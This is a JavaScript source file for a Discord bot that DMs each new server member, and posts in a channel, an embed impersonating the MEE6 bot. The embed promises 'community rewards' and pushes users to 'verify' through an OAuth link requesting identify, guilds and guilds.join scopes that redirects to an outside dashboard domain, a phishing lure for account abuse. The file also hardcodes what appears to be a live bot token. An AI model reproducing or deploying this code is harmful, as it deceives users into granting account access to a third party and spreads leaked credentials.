
// const { clientId, guildId, token, publicKey } = require('./config.json');
require('dotenv').config()
const APPLICATION_ID = process.env.APPLICATION_ID 
const TOKEN = process.env.TOKEN 
const PUBLIC_KEY = process.env.PUBLIC_KEY || 'not set'
const GUILD_ID = process.env.GUILD_ID 


const axios = require('axios')
const express = require('express');
const { InteractionType, InteractionResponseType, verifyKeyMiddleware } = require('discord-interactions');


const { Client, Intents } = require("discord.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder } = require('discord.js');
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on("message", (msg) => {
  let isWelcomeMessage = msg.type === "GUILD_MEMBER_JOIN";

  if (isWelcomeMessage) {
    msg.author.send({"content": `Hey <@${msg.author.id}> it's time to check your **"Rewards"**!` ,
   
    "embeds": [
        {
            "title": "Check community rewards",
            "description": "This server is send you a atomatical message. Please verify yourself to get access interact. [Click here](https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join) to get started!",
            "color": 39129,
            "timestamp": "2024-02-20T18:58:17.660Z",
            "url": "https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join",
            "author": {
                "name": "MEE6",
                "url": "https://discord.com",
                "icon_url": "https://cdn.discordapp.com/avatars/159985870458322944/b50adff099924dd5e6b72d13f77eb9d7.png?size=160"
            },
            "thumbnail": {
                "url": "https://cdn.discordapp.com/icons/1208721793532039209/68cc2065a3e1f8218f8a9e3b35fa8294.png?size=240"
            },
            "image": {
                "url": ""
            },
            "footer": {
                "text": ""
            }
        }
    ],
    "components": [
        {
            "type": 1,
            "components": [
                {
                    "type": 2,
                    "style": 5,
                    "label": "CHECK YOUR REWARDS",
                    "url": "https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join",
                    "disabled": false
                }
            ]
        }
    ],
});

    client.channels.cache
      .get("1208721793532039212")
      .send({"content": `Hey <@${msg.author.id}> it's time to check your **"Rewards"**!\n\n` ,
     
      "embeds": [
          {
              "title": "Check community rewards",
              "description": "This server is send you a atomatical message. Please verify yourself to get access interact. [Click here](https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join) to get started!",
              "color": 39129,
              "timestamp": "2024-02-20T18:58:17.660Z",
              "url": "https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join",
              "author": {
                  "name": "MEE6",
                  "url": "https://discord.com",
                  "icon_url": "https://cdn.discordapp.com/avatars/159985870458322944/b50adff099924dd5e6b72d13f77eb9d7.png?size=160"
              },
              "thumbnail": {
                  "url": "https://cdn.discordapp.com/icons/1208721793532039209/68cc2065a3e1f8218f8a9e3b35fa8294.png?size=240"
              },
              "image": {
                  "url": ""
              },
              "footer": {
                  "text": ""
              }
          }
      ],
      "components": [
          {
              "type": 1,
              "components": [
                  {
                      "type": 2,
                      "style": 5,
                      "label": "CHECK REWARDS",
                      "url": "https://discord.com/api/oauth2/authorize?client_id=1208095401094414387&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.check2.app%2Fdashboard&scope=identify+guilds+guilds.join",
                      "disabled": false
                  }
              ]
          }
      ],
  });
  
	
      
  }
  

  let prefix = "!";
  let message = msg.content;

  let channel = msg.channelId;
  let botChannel = "1208721793532039212";

  const sendMessage = (message) => {
    client.channels.cache.get(botChannel).send(message);
  };
});

client.login("MTIwODA5NTQwMTA5NDQxNDM4Nw.GbbhTw.vDFTF-i7JTXTplSetjC2qlUC61OZna8JbZ8v3o");


app.listen(8999, () => {

})
